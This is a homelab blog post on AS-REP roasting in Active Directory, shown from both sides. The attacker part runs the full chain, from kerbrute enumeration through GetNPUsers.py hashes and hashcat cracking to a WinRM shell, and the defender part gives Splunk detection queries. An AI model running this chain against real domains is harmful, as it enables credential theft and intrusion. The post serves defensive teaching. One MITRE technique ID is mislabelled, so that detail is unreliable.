---
layout: single
classes: wide
title:  "Detecting Kerberos Abuse Part 1: ASReproasting"
date:   2026-02-15 00:06:59 -0500
categories: homelab blueteam kerberos
---

This is the first in a series of posts that will cover compromise chains based on Kerberos abuse, this one covering ASReproasting. I will split it up into an **ATTACKER** section and **DEFENDER** section to cover both perspectives.

# ASReproasting Theory

ASREProasting abuses Kerberos accounts configured without "preauthentication". During the Kerberos authentication process, the client asks the KDC (Key Distribution Center, running on DC01 in this lab), for a TGT (Ticket Granting Ticket). Preauthentication happens during this step, where the user passes a key to the KDC which is derived from their password + timestamp. Kerberos uses this to ensure that the user is requesting a TGT for themselves.

If preauthentication is disabled for a user, it is possible to request a TGT for that user without knowing their credentials. It essentially tells Kerberos to waive the requirement for the pre-authentication key, and therefore the user's password.

The TGT sent back to the user contains a session key encrypted with the user's NT password hash. An attacker could obtain this hash and attempt to crack it offline in order to obtain the user's password. This is tricky for defenders to detect as the kerberos authentication looks normal and legitimate from the DC's perspective. The attacker can crack the password hash offline at their leisure, so there will not be login failure events generated like with a standard bruteforce attack.

# Laying out the Scenario

To perform the attack, I will be working from the `PENTEST` machine. This machine has network connectivity to the AD domain, but is not a member of the domain, nor does the attacker start with a set of AD credentials or a compromised account.

In the real world, this scenario could occur out in a number of ways:

- Attacker exploits a public-facing service, such as getting RCE on a web application
- Attacker gains control of a computer that connected to an unsegmented guest wifi network
- Attacker gains access to an Azure resource on the same VNet as the DC

What the attacker **will** have in this scenario is a list of potential usernames.  In the real world, an attacker could build a username wordlist through publicly visible email addresses on LinkedIn or a company website. The could also have also acquired them through recon phishing emails.

Let's say our attacker did some homework and has this user wordlist to start:

```
jsmith
j.smith
john.smith
lwang
l.wang
li.wang
anowak
a.nowak
alicia.nowak
jdenton
jcdenton
j.denton
``` 

This list will contain some nonexistent users. If an attacker built this out from email addresses, they would not be certain of the username format the domain actually uses, which is why there are identical names in different formats.

Let's get started.

# ATTACKER PERSPECTIVE: Recon -> ASReproasting

Using our machine with AD network access, we can enumerate the network using nmap to look for targets:

```
hacker@Pentest:~$ sudo nmap -sS 10.0.0.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-19 01:26 UTC
Nmap scan report for _gateway (10.0.0.1)
Host is up (0.00037s latency).
All 1000 scanned ports on _gateway (10.0.0.1) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 12:34:56:78:9A:BC (Unknown)

Nmap scan report for dc01.internal.cloudapp.net (10.0.0.4)
Host is up (0.0010s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
MAC Address: 12:34:56:78:9A:BC (Unknown)

Nmap scan report for wkst-01.internal.cloudapp.net (10.0.0.5)
Host is up (0.00089s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
MAC Address: 12:34:56:78:9A:BC (Unknown)

Nmap done: 256 IP addresses (2 hosts up) scanned in 10.02 seconds`
```

From this scan, it's clear that `10.0.0.4` is a DC based on the open ports and running services. 

From here, the attacker's objective is to get a set of user credentials to get a foothold in the domain. By default, modern domains will not allow you to perform an anonymous LDAP bind or get a null SMB session that will allow you to enumerate the domain. I mention this because you tend to see this sort of entry point in lab environments or CTFs. But there are plenty of very old domains in the wild where this might not be the case.

I **can** get the domain name and the hostname of the DC with `ldapsearch -x -H ldap://10.0.0.4:389 -s base`, but not much else without doing a credentialed bind:

```
hacker@Pentest:~$ ldapsearch -x -H ldap://10.0.0.4:389 -b "dc=btlab,dc=local" "objectClass=User" sAMAccountName
# extended LDIF
#
# LDAPv3
# base <dc=btlab,dc=local> with scope subtree
# filter: objectClass=User
# requesting: sAMAccountName 
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090D44, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v65f4
```

I will use `kerbrute` to enumerate usernames in order to pare down the user list and see if there are any valid users present. The reason `kerbrute` works for this is because Kerberos responds differently when a user exists vs. when it doesn't.

From https://github.com/ropnop/kerbrute:

>To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a Windows event ID 4768 if Kerberos logging is enabled.

![](/img/blueteamlab/parttwo/Pasted image 20260201213250.png)

Kerbrute finds 4 valid usernames from our list of 12. 

We'll build a new userlist using these confirmed ones, then attempt ASReproasting. I will be using GetNPUsers.py from [impacket](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) for this.

```
hacker@Pentest:~$ GetNPUsers.py -dc-ip 10.0.0.4 -no-pass -usersfile realusers.txt "btlab.local/" 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jdenton@BTLAB.LOCAL:35260a4577fc1115984ecbc3a9f1b6c3$06ce44df54d762aa3aabbd7f2ced35d5a24aebab728ad9ee70adc54afc290162d1d2b2bf3f5ea9fed88372913a4ba1512b57e7fc01f9de0e045b6a45284964a25d9d290c94b1f5e2f2e1f5c594da4a77fa9dbd0b826fd3b41f36954b98199c76e2f7ca4257dba46025bae288f34bbbf370c1f7263449be678cb1886552024122c6018332c49276080824db1e0e927042697ea5735134febd48dbef00199920a699b6f438b7815f03e72745734fab1d7a7e6b624c2fcc47024a6b381c7d88517dfe190f0ea6f37be98d9a9366e0f02efaf6de9b11667ed6534dc3484f00770e68d1ce8b4d632f9390b2e5
[-] User anowak doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$lwang@BTLAB.LOCAL:eaaee8740bc23d90acca19651c0b5f91$5024dbe55dbe9862eeaf5aa54ec8a32ab93f3acf54776a1167d1bda6b0a1af208d64c997b140edf5542bb650d9b7db71836a22f7c5db01f401023dc209b0151fea768f883821f5e7723bc2bee8cdda95411d53c020e96ba5d5156bbc27ee0447b2a5962399154342b5a9ea6192d8531f8d7909e6f6cbcb352c99ace0c6138676ce3ecec9054e7816a7e28c0c6c59c76987f99f96aa0efb1a50ff06da9af8f141048de6c5d82b070b887335bc375cbaa4a41ce5af5a4033411ca0325ef0c4ce2c76b4c7da3bd1c86ecd0e689502f428a0608a8213b0b827d388a3874e690f75c21e2f3f18904ff23af05b
```

We get session keys for `jdenton` and `lwang`, which we can try to crack offline with hashcat. Use mode 18200 for Kerberos AS-REP cracking.

`C:\hashcat>hashcat.exe -m 18200 jdenton.asreproast rockyou.txt`

![](/img/blueteamlab/parttwo/Screenshot 2026-02-14 202918.png)

No luck with `lwang`, but We can crack the hash and get a password for `jdenton`:`bionicman`.

I use netexec to test the credentials in a few places and discover that `jdenton` can use winrm on `WKST-01`. 

```
hacker@Pentest:~$ netexec winrm 10.0.0.5 -u 'jdenton' -p 'bionicman'
WINRM       10.0.0.5        5985   WKST-01          [*] Windows 10 / Server 2019 Build 19041 (name:WKST-01) (domain:btlab.local) 
WINRM       10.0.0.5        5985   WKST-01          [+] btlab.local\jdenton:bionicman (Pwn3d!)
```

We can use `evil-winrm` in order to get a shell and achieve a foothold.

![](/img/blueteamlab/parttwo/Pasted image 20260204231248.png)


# DEFENDER PERSPECTIVE: Recon -> ASReproasting

## Detecting Username Bruteforcing

If an attacker attempts to bruteforce usernames using a tool like `kerbrute`, a number of 4768 events will be generated. When Kerberos is sent a TGT request with no preauthentication for an invalid username, it generates a 4768 event with a `0x6` Result Code, so we can look for a large number of those within a short timespan from one source IP to detect kerberos username enumeration.

```
index=wineventlog EventCode=4768 Result_Code=0x6
| bucket span=1m _time 
| stats count AS kerberos_requests by src_ip, _time
| where kerberos_requests > 50
```

If we find something, we can also use the following query to list the unique accounts that were attempted.

```
index=wineventlog EventCode=4768 Result_Code=0x6 Account_Name!="*$" 
| bucket span=1m _time  
| stats  dc(Account_Name) AS unique_accounts values(Account_Name) as tried_accounts values(dest) as dest by _time, src_ip
```

![](/img/blueteamlab/parttwo/Pasted image 20260202223237.png)

Notice how we only logged 8 events for the 12 accounts that were bruteforced. The 4 real users that kerbrute determined do not show up here. This is because kerbrute does not actually attempt to authenticate as the user, it just waits for Kerberos to prompt for pre-authentication, then uses that to determine that the user is real. Hence, no 4768 Audit Success event is generated.

## Detecting ASReproasting

Detecting ASReproasting is tricky since the attack abuses legitimate Kerberos behavior. There are no authentication failures or error conditions at play from the DC's perspective. However, we can detect events that specify that no pre-authentication was used as a baseline. This will show all 4768 events originating from ASReproastable accounts. We can also filter on use of RC4 encryption.

```
index=wineventlog EventCode=4768 Pre_Authentication_Type=0 Ticket_Encryption_Type=0x17
```

### PRIMARY INDICATOR: Detecting Disabled Preauthentication

`Pre_Authentication_Type=0` is going to be the main signal for detecting ASReproasting. This corresponds to the pre-authentication mechanism used in the AS-REQ, 0 being none. If a client requests a TGT for an account with pre-authentication disabled, the event will have this field set to 0. AS-REQs from normal accounts will have type 2, which corresponds to the typical timestamp + password pre-authentication method. [RFC4120](https://datatracker.ietf.org/doc/html/rfc4120#section-5.2.7) defines the PA-DATA section of AS-REQ requests. However, the usefulness of this signal will vary in your own environment based on how many preauth-disabled accounts you have generating legitimate traffic. 

### Use of RC4 Encrypted Tickets

`Ticket_Encryption_Type=0x17` corresponds to tickets encrypted with the RC4 algorithm, which is considered insecure by today's standards. Microsoft is apparently working to phase it out, and released an update in late 2022 to make accounts use the more secure AES-SHA1 by default instead. RC4 is still used for legacy compatibility. Tools like Rubeus or GetNPUsers.py will specifically request RC4 because it is the weakest algorithm available and the resulting session keys will be easier to crack.

Mileage may vary in your own environment, depending on how much legacy stuff you have that requires RC4.  Check out this [Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos) article for details on how to audit your RC4 usage and even disable it entirely.

As an aside, RC4 being phased out/disabled is not going to make kerberoasting irrelevant. AES-SHA1 is going to make the hashes more difficult/expensive for attackers to crack, but they can still collect the tickets and try.

### Other Signals

One way to make this detection stronger is searching based on the absence of a subsequent logon. We can search for Event 4768s that do not correspond with a later Event 4624 indicating a successful logon or Event 4769 indicating a kerberos ST request. This would indicate that the TGT was likely harvested for ASReproasting and not used to legitimately authenticate to a service. However, this method is limited by the fact that it relies the absence of another behavior (a subsequent login). Other indicators could be a high volume of AS-REQs from a single source, or from unexpected sources. Keep in mind however that there are likely thousands of these events happening per minute in a production domain. Basing detection on this sort of statistical anomaly will take some fine-tuning and knowledge of what your baselines are.

### Detecting Pre-Attack Indicators

Another reliable way to detect ASReproasting in your environment is to look for attacker activity that typically happens before any ASReproasting occurs. This can take the form of:

- Searching for accounts that have the `DoesNotRequirePreAuth` flag set
- Setting the `DoesNotRequirePreAuth` flag on an account 

The following queries will detect the specific Powershell commands that would accomplish these. Note that you would need Powershell Script Block Logging enabled on the log-generating machine in order to see these events and the contents of the script blocks. This will show you the raw Powershell code that ran. Notably, this will even show decoded Powershell that was run with the `-enc` parameter. 

WARNING: It is also worth noting that if you are running Powershell scripts containing plaintext credentials, those credentials will show up plain as day in the 4104 events. 

An attacker could evade Script Block logging by using a "Downgrade Attack" where they use Powershell v2 to execute their commands, which does not support Script Block Logging or AMSI. A defender could remediate this by disabling Powershell v2 in their environment, or by writing specific detections to track the use of Powershell v2.  

This is an excellent article by Rob Willis that covers many aspects of Powershell logging (including how to enable it, if that's all you need):
https://www.robwillis.info/2019/10/everything-you-need-to-know-to-get-started-logging-powershell/

Moving on to the detection SPL:

#### Detect PreAuthentication Flag Disabled with Set-ADAccountControl

This SPL will utilize 4104 Events generated by Script Block logging to detect an attacker enabling pre-authentication for a user through the `Set-ADAccountControl` Powershell cmdlet.

```
index=wineventlog EventCode=4104 (Message="*Set-ADAccountControl*" AND Message="*DoesNotRequirePreAuth:$true*") 
```

#### Detect PreAuthentication Flag Disabled with UserAccountControl

This SPL detects 4738 Events (User Account was changed) that enable the "Do not require Kerberos preauthentication" on an AD accounts properties. This will trigger if the attacker were to make this change through the AD Users and Computers GUI under the user's account options.

```
index=wineventlog EventCode=4738 MSADChangedAttributes="*\'Don\'t Require Preauth\' - Enabled*"
```

#### Detect Disabled PreAuthentication Account Discovery with Get-ADUser

These use 4104 Events to detect an attacker searching for user accounts that have "Do not require Kerberos preauthentication" enabled.

```
index=wineventlog EventCode=4104 (Message="*Get-ADUser*" AND Message="*DoesNotRequirePreAuth -eq $true*") 
```

This query will detect enumeration via the userAccountControl property on an AD account.

```
index=wineventlog EventCode=4104 (Message="*Get-ADUser*" AND Message="*4194304*") 
```

This will catch multiple search methods including the standard Get-ADUser filter or LDAP filters, like the following commands:

```
Get-ADuser -Filter 'userAccountControl -band 4194304' | -Properties Name, userAccountControl
```
```
Get-ADUser -LDAPFilter '(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' -Properties Name, userAccountControl
```

![](/img/blueteamlab/parttwo/Pasted image 20260214162229.png)


Moving back to the compromise chain scenario:

The first time we're likely to be made aware of an attack is if we're alerted on one of the pre-attack indicators or a 4768 Event with `Pre_Authentication_Type=0`. Since the attacker in this scenario did their enumeration from a userlist on a non-domain-joined machine, they would not have triggered any of the pre-attack indicators. 

However, this SPL would have caught the ASReproasting attempt:

```
index=wineventlog EventCode=4768 Pre_Authentication_Type=0 Ticket_Encryption_Type=0x17
```

Let's investigate further:

```
index=wineventlog EventCode=4768 Pre_Authentication_Type=0 Ticket_Encryption_Type=0x17 | stats dc(Account_Name) AS unique_accounts values(Account_Name) as tried_accounts values(dest) as dest by _time, src_ip
```

![](/img/blueteamlab/parttwo/Pasted image 20260214221441.png)

Looking at the source IP, these events are being generated by a device at `10.0.0.7` and are requesting TGTs for the users `jdenton` and `lwang`. Since this isn't a domain joined machine on the network, this is already a huge red flag and would indicate a rogue or otherwise compromised device that has access to the AD subnet. Adding this IP to our filters will help investigate further. The timestamps of these events are around `2026-02-14 21:49:33`, so this is also giving us a timeframe to look at. 

For now I'm going to search windows event logs in an hour time range of the original events that contain `10.0.0.7`.

![](/img/blueteamlab/parttwo/Pasted image 20260214223204.png)

I get 22 events back, with a mix of 4768 (TGT request) and 4624 (Successful logon).

![](/img/blueteamlab/parttwo/Pasted image 20260214223745.png)

Looking at the 4768 events, there appear to be several in quick succession for different users, with some not existing and returning `0x6`. The two that return `0x0` are the two accounts that have preauth not required. This would indicate that the attacker attempted to bruteforce based on suspected usernames and may not have a foothold that would allow him to query the domain and get a complete list.

![](/img/blueteamlab/parttwo/Pasted image 20260214231046.png)

The 4624 events indicate that a successful logon occured on `WKST-01` at starting at `21:54:20 PM` as `jdenton`, coming from `10.0.0.7`. No successful logons for `lwang` are seen in this timeframe.

![](/img/blueteamlab/parttwo/Pasted image 20260214225035.png)

I'm going to start looking at sysmon logs on `WKST-01` for suspicious activity. I get some results for commands executed as `jdenton` starting at `21:55:34`, which matches up with our timeframe.

![](/img/blueteamlab/parttwo/Pasted image 20260214225846.png)

The attacker executed `whoami.exe` and some other basic enumeration using `net.exe`.

![](/img/blueteamlab/parttwo/Pasted image 20260214230113.png)

As this point, the evidence indicates that the `jdenton` account is likely compromised and is being used for command execution on `WKST-01`. The source IP of `10.0.0.7` appears to be a rogue device on the network that is acting as the point of entry. The attack appears to begin at `2026-02-14 21:47:00`, when there was an attempt to bruteforce usernames using kerberos. The attacker gained command execution on `WKST-01` shortly after at `21:55:34`. 

If the attack had started from a domain-joined machine, we would need to examine that machine and the credentials used, as those would likely be compromised as well.

Immediate containment steps:

- Disable `WKST-01` Computer object in AD.
- Change passwords for `jdenton` and `lwang` accounts, and disable them if not in use.
- Deny connections to and from `10.0.0.7` via network firewall

# MITRE ATT&CK Mapping

- [T1021.006](https://attack.mitre.org/techniques/T1021/006/) - Gather Victim Identity Information: Email Addresses
- [T1046](https://attack.mitre.org/techniques/T1046/) - Network Service Discovery
- [T1087.002](https://attack.mitre.org/techniques/T1087/002/) - Account Discovery: Domain Accounts
- [T1558.004](https://attack.mitre.org/techniques/T1558/004/) - Steal or Forge Kerberos Tickets: AS-REP Roasting
- [T1021.006](https://attack.mitre.org/techniques/T1021/006/) - Remote Services: Windows Remote Management

# Wrapping Up

Okay, role-playing over. If you're still reading this, then hopefully you have a better understanding of how ASReproasting attacks work and how they look from both sides of the aisle. 

I was originally unsure about starting the attack from a non-domain-joined machine, as it is a bit less realistic than a user account compromised through phishing or something. It did force me to think a bit harder about detection without access to logs on the "attacker" machine. Monitoring pre-attack indicators seems like the best signal-to-noise ratio detection method, but that would not work in this scenario. 

Thinking about longer term remediation steps made me realize the impact that a rogue device would realistically have. I gave the possible scenarios of a compromised public-facing web server or a compromised laptop on a wifi network, which would obviously have very different steps to remediate. There is also the possibility that said rogue device could be acting as a DHCP server or intercepting traffic. You could determine impact by examining network device logs to see when it first became active.